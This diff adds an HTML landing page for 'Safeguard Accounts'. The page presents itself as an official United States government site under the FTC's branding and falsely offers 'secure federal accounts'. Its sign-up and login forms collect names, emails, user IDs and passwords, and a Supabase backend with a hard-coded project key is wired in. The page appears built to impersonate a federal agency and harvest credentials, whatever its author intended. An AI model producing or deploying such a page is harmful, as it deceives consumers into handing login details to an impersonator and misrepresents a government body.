@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Safeguard Accounts</title>
+  <link rel="stylesheet" href="style.css">
+  <!-- put in the <head> or before your own script -->
+<script type="module">
+  import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm'
+
+  const SUPABASE_URL = 'https://hafzffbdqlojkuhgfsvy.supabase.co'   // from your Supabase project
+  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhhZnpmZmJkcWxvamt1aGdmc3Z5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkxOTA0NTksImV4cCI6MjA3NDc2NjQ1OX0.fYBo6l_W1lYE_sGnaxRZyroXHac1b1sXqxgJkqT5rnk'                   // from Supabase
+
+  export const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY)
+</script>
+
+</head>
+<body>
+
+  <!-- Top Banner -->
+  <div class="top-banner">
+    <img src="images/flag.png" alt="US Flag">
+    An official website of the United States government
+  </div>
+
+  <!-- Header -->
+
+<header>
+    <img src="images/header-ftc.png" alt="FTC Header">
+  </header>
+<!-- Navigation -->
+<nav>
+  <div class="nav-container">
+    <div class="logo">
+      <a href="index.html">Safeguard Accounts</a>
+    </div>
+    <div class="menu-toggle" id="menu-toggle">☰</div>
+    <ul id="nav-links">
+      <li><a href="policies.html">Policies</a></li>
+      <li><a href="report-fraud.html">Report Fraud</a></li>
+      <li><a href="#about-ftc">About the FTC</a></li>
+      <li><a href="#" id="login-link">Login</a></li>
+      <li><a href="#" id="signup-link">Sign Up</a></li>
+      <!-- Removed the About link -->
+      <li><a href="#contact">Contact Us</a></li>
+    </ul>
+  </div>
+</nav>
+
+  
+  <!-- Main Content -->
+<main id="about">
+    <section>
+      <h2>Welcome to Safeguard Accounts</h2>
+      <p>
+        At Safeguard Accounts, we are dedicated to protecting your financial identity 
+        and ensuring your banking experience is safe, transparent, and reliable. 
+        By combining federal consumer protection standards with cutting-edge security, 
+        we make sure your information is safeguarded against identity theft and fraud.
+      </p>
+    </section>
+  
+    <section>
+      <h2>Our Mission</h2>
+      <p>
+        Our mission is simple: <strong>to protect consumers in the United States</strong> 
+        by providing secure federal accounts backed by strong oversight and accountability. 
+        Every account we provide meets strict compliance standards to ensure fairness, 
+        transparency, and protection for all.
+      </p>
+    </section>
+  <!-- Take Action Section -->
+<section id="take-action">
+    <h2>Take Action</h2>
+    <div class="action-grid">
+      <a href="report-fraud.html" class="action-btn">
+        <span class="icon">⚠️</span>
+        <p>Report Fraud</p>
+      </a>
+      <a href="submit-comment.html" class="action-btn">
+        <span class="icon">✍️</span>
+        <p>Submit a Public Comment</p>
+      </a>
+      <a href="merger-comment.html" class="action-btn">
+        <span class="icon">📄</span>
+        <p>Merger/Antitrust Comment</p>
+      </a>
+      <a href="free-credit.html" class="action-btn">
+        <span class="icon">💲</span>
+        <p>Get Your Free Credit Report</p>
+      </a>
+      <a href="report-identity.html" class="action-btn">
+        <span class="icon">🪪</span>
+        <p>Report Identity Theft</p>
+      </a>
+      <a href="donotcall.html" class="action-btn">
+        <span class="icon">🚫</span>
+        <p>Register for Do Not Call</p>
+      </a>
+    </div>
+  </section>
+  <!-- Sign Up Modal -->
+<div id="signup-modal" class="modal">
+    <div class="modal-content">
+      <span class="close">&times;</span>
+      <h2>Create Your Account</h2>
+      <form>
+        <label for="name">Full Name</label>
+        <input type="text" id="name" required>
+  
+        <label for="email">Email</label>
+        <input type="email" id="email" required>
+  
+        <label for="password">Password</label>
+        <input type="password" id="password" required>
+  
+        <button type="submit">Sign Up</button>
+      </form>
+    </div>
+  </div>
+  
+    <section>
+      <h2>Why Choose Safeguard Accounts?</h2>
+      <ul>
+        <li>✅ Comprehensive fraud monitoring and prevention systems</li>
+        <li>✅ User-friendly account management tools</li>
+        <li>✅ Backed by federal consumer protection guidelines</li>
+        <li>✅ 24/7 customer support from trained specialists</li>
+        <li>✅ Regular compliance checks and independent audits</li>
+      </ul>
+    </section>
+  
+    <section>
+      <h2>Security You Can Trust</h2>
+      <p>
+        We take your security seriously. Safeguard Accounts uses state-of-the-art 
+        encryption, multi-factor authentication, and advanced identity verification 
+        systems to keep your personal data safe. Every transaction is monitored 
+        for suspicious activity, and our dedicated security team works around the clock.
+      </p>
+    </section>
+  
+    <section>
+        <h2>Identity Theft Protection</h2>
+        <p>
+          Identity theft is one of the fastest-growing crimes in the United States, 
+          costing consumers billions of dollars every year. Criminals can use stolen 
+          personal information to open fraudulent accounts, access your finances, or 
+          damage your credit history.
+        </p>
+        <p>
+          At Safeguard Accounts, we take proactive measures to help protect you from 
+          identity theft. Our security features include:
+        </p>
+        <ul>
+          <li>🔒 Continuous monitoring for unusual account activity</li>
+          <li>🔒 Alerts and notifications when suspicious transactions occur</li>
+          <li>🔒 Strong password enforcement and two-factor authentication</li>
+          <li>🔒 Identity recovery assistance in case of fraud</li>
+        </ul>
+        <p>
+          If you believe you are a victim of identity theft, we provide tools and 
+          resources to help you report the incident, recover your accounts, and 
+          protect your identity moving forward.
+        </p>
+        <p>
+          Our specialists work with federal consumer protection agencies to make 
+          sure your case is handled quickly and effectively. Every report of identity 
+          theft is taken seriously, and our response team is available 24/7 to provide support.
+        </p>
+        <p>
+          Victims of identity theft often face long-term challenges such as damaged 
+          credit scores, denied loans, or harassment from debt collectors. Safeguard Accounts 
+          assists you through the recovery process, helping restore your financial reputation.
+        </p>
+        <p>
+          Education is also part of protection. We regularly share guidance on how to 
+          recognize phishing scams, avoid unsafe websites, and protect sensitive 
+          personal documents from being stolen.
+        </p>
+        <p>
+          By combining advanced security systems with consumer awareness programs, 
+          we work to reduce the risk of identity theft before it happens. Prevention 
+          is always better than cure.
+        </p>
+        <p>
+          Safeguard Accounts also provides free annual security reviews so you can 
+          assess the strength of your account protections and make adjustments as needed. 
+        </p>
+        <p>
+          Remember: protecting your identity is not just our responsibility — it’s a 
+          shared effort. Together, we can keep your financial life safe and secure.
+        </p>
+      </section>
+  
+
+      <!-- New About FTC Section -->
+<section id="about-ftc">
+  <h2>About the FTC</h2>
+  <p>
+    The Federal Trade Commission (FTC) is the United States government agency responsible
+    for protecting consumers and promoting competition. The FTC fights fraud, scams,
+    and unfair business practices, ensuring that consumers are safe and markets remain fair.
+  </p>
+  <p>
+    Through enforcement, policy development, and consumer education, the FTC makes a direct
+    impact in the lives of millions of Americans every year by stopping deceptive practices,
+    recovering funds for victims, and safeguarding the economy.
+  </p>
+</section>
+
+<!-- Login Modal -->
+<div id="login-modal" class="modal">
+  <div class="modal-content">
+    <span class="close" id="close-login">&times;</span>
+    <h2>Login</h2>
+    <form>
+      <label for="userId">User ID</label>
+      <input type="text" id="userId" required>
+
+      <label for="loginPassword">Password</label>
+      <input type="password" id="loginPassword" required>
+
+      <label>
+        <input type="checkbox" id="keepSignedIn"> Keep me signed in
+      </label>
+
+      <button type="submit">Login</button>
+    </form>
+  </div>
+</div>
+
+<!-- Contact Us Section -->
+<footer id="contact">
+  <h2>Contact Us</h2>
+  <form id="contactForm">
+    <textarea id="contactQuery" placeholder="Type your query here..." required></textarea><br>
+    <button type="submit">Click here to submit</button>
+    <p id="contactMessage"></p>
+  </form>
+  <p>&copy; 2025 Safeguard Accounts. All rights reserved.</p>
+</footer>
+
+  <!-- Footer -->
+  <footer id="contact">
+    <p>Contact Us: support@safeguardaccounts.com | Phone: (123) 456-7890</p>
+    <p>&copy; 2025 Safeguard Accounts. All rights reserved.</p>
+  </footer>
+
+  <!-- Sign Up Modal -->
+  <div id="signupModal" class="modal">
+    <div class="modal-content">
+      <span class="close-btn" id="closeModal">&times;</span>
+      <h2>Sign Up</h2>
+      <input type="text" id="name" placeholder="Full Name">
+      <input type="email" id="email" placeholder="Email">
+      <input type="password" id="password" placeholder="Password">
+      <button onclick="submitSignup()">Submit</button>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
+
+
